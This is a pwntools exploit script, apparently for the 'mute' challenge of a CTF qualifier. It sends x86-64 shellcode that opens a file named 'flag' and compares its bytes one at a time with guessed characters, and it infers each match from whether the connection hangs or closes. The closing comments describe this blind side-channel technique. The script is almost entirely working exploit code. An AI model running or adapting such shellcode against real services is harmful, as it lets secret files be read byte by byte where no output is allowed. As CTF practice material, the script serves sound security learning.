from pwn import *
import string
import sys
context.log_level = 'info'

def pwn():
    code = '''
        push 0
        push 0x67616c66
        mov rdi, rsp
        mov rsi, 0x0
        mov rax, 2
        syscall /* read */
        mov rdi, rax
        xor rax, rax
        mov rdx, ''' + str(int(sys.argv[1]) + 1) + '''
        mov rsi, rsp
        syscall
        mov rbx, [rsp + ''' + sys.argv[1] + ''']
        and rbx, 0xff
        mov rdi, 0
        xor rax, rax
        mov rdx, 0x2
        mov rsi, rsp
        syscall
        mov rax, [rsp]
        and rax, 0xff
        cmp rax, rbx
        je $+3
        ret
        mov rdi, 0
        mov rax, 0
        mov rdx, 0x100
        mov rsi, rsp
        syscall
    '''
    
    sc = asm(code, arch = 'x86_64')
    
    
    #pause()
    
    p.send(sc.ljust(4096, '\x90'))
    

for i in '0123456789.qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM':
    p = remote('mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me', 443)
    #p = process('./mute')
    #pause()
    log.info(i)
    pwn()
    sleep(1)
    p.sendline(i)  
    print p.recvall()
    p.close()


# in this challenge, we cant do write_syscall
# so we almost cant do anything.
# but we can read flag file byte by byte and compare it one by one to our input
# if je, we will read again and the sokcet hangs, but if jnz, the socket will end and we will recv a EOF

